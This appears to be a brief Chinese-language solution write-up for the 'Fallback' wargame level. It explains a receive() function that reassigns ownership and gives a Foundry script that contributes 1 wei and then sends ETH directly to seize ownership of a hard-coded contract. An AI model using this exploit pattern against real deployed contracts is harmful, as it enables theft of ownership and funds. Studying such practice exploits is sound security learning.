# Fallback


通过查看合约，发现存在`receive()`函数，并且会修改合约的owner。只要我们在向合约发送ETH前，调用`contribute()`函数即可。

```solidity
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackScript is Script {
    Fallback public fb = Fallback(payable(0x81376dC00af52379eC92aa7Ad9Acf9A58953C0c7));

    function setUp() public {
    }

    function run() public {
        vm.startBroadcast();

        fb.contribute{value: 1 wei}();
        payable(0x81376dC00af52379eC92aa7Ad9Acf9A58953C0c7).call{value: 1 wei}("");
        vm.stopBroadcast();
    }
}
```